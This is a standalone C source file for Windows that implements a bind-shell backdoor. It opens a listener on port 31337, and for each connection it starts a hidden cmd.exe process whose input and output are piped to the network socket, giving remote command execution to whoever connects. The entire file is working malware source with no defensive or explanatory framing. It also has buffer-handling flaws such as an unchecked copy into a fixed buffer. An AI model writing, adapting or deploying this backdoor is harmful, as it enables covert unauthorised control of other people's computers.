#include <stdio.h>
#include <windows.h>
#include <shellapi.h>
#include <winsock.h>
#include <wininet.h>
#include <urlmon.h>
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "urlmon.lib")
#pragma comment (lib, "wininet.lib")

static VOID SessionReadShellThreadFn(LPVOID Parameter);
static HANDLE StartShell(HANDLE ShellStdinPipeHandle, HANDLE ShellStdoutPipeHandle);
DWORD WINAPI BackDoor(LPVOID p);
int CmdShell(SOCKET sock);
static VOID SessionWriteShellThreadFn(LPVOID Parameter);

struct SESSION_DATA 
{
    HANDLE  ReadPipeHandle;
    HANDLE  WritePipeHandle;
    HANDLE  ProcessHandle;
    SOCKET  ClientSocket;
    HANDLE  ReadShellThreadHandle;
    HANDLE  WriteShellThreadHandle;
};

struct SESSION_DATA* CreateSession(void)
{
    struct SESSION_DATA* Session;
    SECURITY_ATTRIBUTES SA;
    HANDLE ShellStdinPipe = NULL;
    HANDLE ShellStdoutPipe = NULL;

    Session=(struct SESSION_DATA*)malloc(sizeof(struct SESSION_DATA));

    Session->ReadPipeHandle  = NULL;
    Session->WritePipeHandle = NULL;

    SA.nLength = sizeof(SA);
    SA.lpSecurityDescriptor = NULL;
    SA.bInheritHandle = TRUE;

    if(!CreatePipe(&Session->ReadPipeHandle, &ShellStdoutPipe,&SA, 0)) {
		if(Session->ReadPipeHandle != NULL) CloseHandle(Session->ReadPipeHandle);
		if(ShellStdoutPipe != NULL)			CloseHandle(ShellStdoutPipe);
		free(Session);
		return NULL;
    }

    if(!CreatePipe(&ShellStdinPipe, &Session->WritePipeHandle,&SA, 0)) {
		if(Session->ReadPipeHandle != NULL) CloseHandle(Session->ReadPipeHandle);
		if(ShellStdoutPipe != NULL) CloseHandle(ShellStdoutPipe);
		if(Session->WritePipeHandle != NULL) CloseHandle(Session->WritePipeHandle);
		if(ShellStdinPipe != NULL) CloseHandle(ShellStdinPipe);
		free(Session);
		return NULL;
    }

    Session->ProcessHandle = StartShell(ShellStdinPipe, ShellStdoutPipe);
    CloseHandle(ShellStdinPipe);
    CloseHandle(ShellStdoutPipe);

    return(Session);
}

int CmdShell(SOCKET sock)
{
    SECURITY_ATTRIBUTES SecurityAttributes;
    DWORD ThreadId;
    HANDLE HandleArray[3];
    int i;

    SOCKET client = (SOCKET)sock;
    struct SESSION_DATA* Session;

	Session=(struct SESSION_DATA*)malloc(sizeof(struct SESSION_DATA));
    Session= CreateSession();

    SecurityAttributes.nLength = sizeof(SecurityAttributes);
    SecurityAttributes.lpSecurityDescriptor = NULL;
    SecurityAttributes.bInheritHandle = FALSE;

    Session->ClientSocket = client;
    Session->ReadShellThreadHandle = CreateThread(&SecurityAttributes, 0, (LPTHREAD_START_ROUTINE) SessionReadShellThreadFn, (LPVOID) Session, 0, &ThreadId);

    if (Session->ReadShellThreadHandle == NULL)	{
        Session->ClientSocket = INVALID_SOCKET;
        return 1;
    }

    Session->WriteShellThreadHandle = CreateThread(&SecurityAttributes, 0, (LPTHREAD_START_ROUTINE) SessionWriteShellThreadFn, (LPVOID) Session, 0, &ThreadId);

    if (Session->WriteShellThreadHandle == NULL) {
		Session->ClientSocket = INVALID_SOCKET;
        TerminateThread(Session->WriteShellThreadHandle, 0);
        return 1;
    }

    HandleArray[0] = Session->ReadShellThreadHandle;
    HandleArray[1] = Session->WriteShellThreadHandle;
    HandleArray[2] = Session->ProcessHandle;

    i = WaitForMultipleObjects(3, HandleArray, FALSE, 0xffffffff);

	switch (i) {
        case WAIT_OBJECT_0 + 0:
            TerminateThread(Session->WriteShellThreadHandle, 0);
            TerminateProcess(Session->ProcessHandle, 1);
            break;
        case WAIT_OBJECT_0 + 1:
            TerminateThread(Session->ReadShellThreadHandle, 0);
            TerminateProcess(Session->ProcessHandle, 1);
            break;
        case WAIT_OBJECT_0 + 2:
            TerminateThread(Session->WriteShellThreadHandle, 0);
            TerminateThread(Session->ReadShellThreadHandle, 0);
            break;
	default:
            break;
    }

    closesocket(Session->ClientSocket);
    DisconnectNamedPipe(Session->ReadPipeHandle);
    CloseHandle(Session->ReadPipeHandle);
    DisconnectNamedPipe(Session->WritePipeHandle);
    CloseHandle(Session->WritePipeHandle);
    CloseHandle(Session->ReadShellThreadHandle);
    CloseHandle(Session->WriteShellThreadHandle);
    CloseHandle(Session->ProcessHandle);
	if(Session != NULL)	free(Session);

	return 0;
}



static HANDLE StartShell(HANDLE ShellStdinPipeHandle, HANDLE ShellStdoutPipeHandle)
{
    PROCESS_INFORMATION ProcessInformation;
    STARTUPINFO si;
    HANDLE ProcessHandle = NULL;
    char CmdShell[12];

    si.cb = sizeof(STARTUPINFO);
    si.lpReserved = NULL;
    si.lpTitle = NULL;
    si.lpDesktop = NULL;
    si.dwX = si.dwY = si.dwXSize = si.dwYSize = 0L;
    si.wShowWindow = SW_HIDE;
    si.lpReserved2 = NULL;
    si.cbReserved2 = 0;

    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    si.hStdInput  = ShellStdinPipeHandle;
    si.hStdOutput = ShellStdoutPipeHandle;

    DuplicateHandle(GetCurrentProcess(), ShellStdoutPipeHandle, GetCurrentProcess(), &si.hStdError, DUPLICATE_SAME_ACCESS, TRUE, 0);
		strcpy(CmdShell,"cmd.exe");

    if (CreateProcess(NULL, CmdShell, NULL, NULL, TRUE, 0, NULL, NULL, &si, &ProcessInformation)) {
        ProcessHandle = ProcessInformation.hProcess;
        CloseHandle(ProcessInformation.hThread);
    }

    return(ProcessHandle);
}

static VOID SessionReadShellThreadFn(LPVOID Parameter)
{
    struct SESSION_DATA* Session;

    BYTE    Buffer[20];
    BYTE    Buffer2[50];
    DWORD   BytesRead;

    Session=(struct SESSION_DATA*)malloc(sizeof(struct SESSION_DATA));
    memcpy(Session,Parameter,sizeof(struct SESSION_DATA));

    while (PeekNamedPipe(Session->ReadPipeHandle, Buffer, sizeof(Buffer), &BytesRead, NULL, NULL)) {
		DWORD BufferCnt, BytesToWrite;
        BYTE PrevChar = 0;
        if (BytesRead > 0)
	    	ReadFile(Session->ReadPipeHandle, Buffer, sizeof(Buffer), &BytesRead, NULL);
        else {
  	    	Sleep(50);
	    	continue;
		}
        for (BufferCnt = 0, BytesToWrite = 0; BufferCnt < BytesRead; BufferCnt++) {
            if (Buffer[BufferCnt] == '\n' && PrevChar != '\r')
                Buffer2[BytesToWrite++] = '\r';
            PrevChar = Buffer2[BytesToWrite++] = Buffer[BufferCnt];
        }

        if (send(Session->ClientSocket, (char*)Buffer2, BytesToWrite, 0) <= 0)
            break;
    }

    if(GetLastError()!= ERROR_BROKEN_PIPE) {;}

    free(Session);
    ExitThread(0);
}


static VOID SessionWriteShellThreadFn(LPVOID Parameter)
{
    struct SESSION_DATA* Session;
    BYTE    RecvBuffer[1];
    BYTE    Buffer[20];
    BYTE    EchoBuffer[5];
    DWORD   BytesWritten;
    DWORD   BufferCnt, EchoCnt;
    DWORD   TossCnt = 0;
    BOOL    PrevWasFF = FALSE;

    Session=(struct SESSION_DATA*)malloc(sizeof(struct SESSION_DATA));
    memcpy(Session,Parameter,sizeof(struct SESSION_DATA));

    BufferCnt = 0;
    while (recv(Session->ClientSocket, (char*)RecvBuffer, sizeof(RecvBuffer), 0) != INVALID_SOCKET) {
        EchoCnt = 0;
        Buffer[BufferCnt++] = EchoBuffer[EchoCnt++] = RecvBuffer[0];
        if (RecvBuffer[0] == '\r')
                Buffer[BufferCnt++] = EchoBuffer[EchoCnt++] = '\n';
		if (strnicmp((char*)Buffer, "exit\r\n", 6) == 0) {
			free(Session);
	    	ExitThread(0);
		}
        if (RecvBuffer[0] == '\n' || RecvBuffer[0] == '\r') {
            if (! WriteFile(Session->WritePipeHandle, Buffer, BufferCnt, &BytesWritten, NULL)) break;
            BufferCnt = 0;
        }
    }

    free(Session);
    ExitThread(0);
}

DWORD WINAPI BackDoor(LPVOID p)
{
	SOCKET wsl;
	SOCKET wsh;
	int nSize;
	struct sockaddr_in door;
	struct sockaddr_in client;

	WSADATA data;
    if(WSAStartup(MAKEWORD(1,1),&data)!=0) 
		ExitThread(1);

    if((wsl = socket(PF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
		ExitThread(1);
    door.sin_family = PF_INET;
    door.sin_addr.s_addr = htonl(INADDR_ANY);
    door.sin_port = htons(31337);

    if(bind(wsl, (const struct sockaddr *) &door,sizeof(door)) == INVALID_SOCKET) 
	{
		closesocket(wsl);
		ExitThread(1);
	}

    if(listen(wsl, SOMAXCONN) == INVALID_SOCKET) 
	{
		closesocket(wsl);
		ExitThread(1);
	}
	
	for(;;)
	{
		nSize=sizeof(client);
		wsh=accept(wsl,(struct sockaddr *)&client,&nSize);
		if(wsh==INVALID_SOCKET) 
			ExitThread(1);
		CmdShell(wsh);
	}
	
	WSACleanup();
	ExitThread(0);
}

int main()
{	
	unsigned long id_backdoor;
	CreateThread(0,0,BackDoor,0,0,&id_backdoor);
	getchar();
	return 0;
}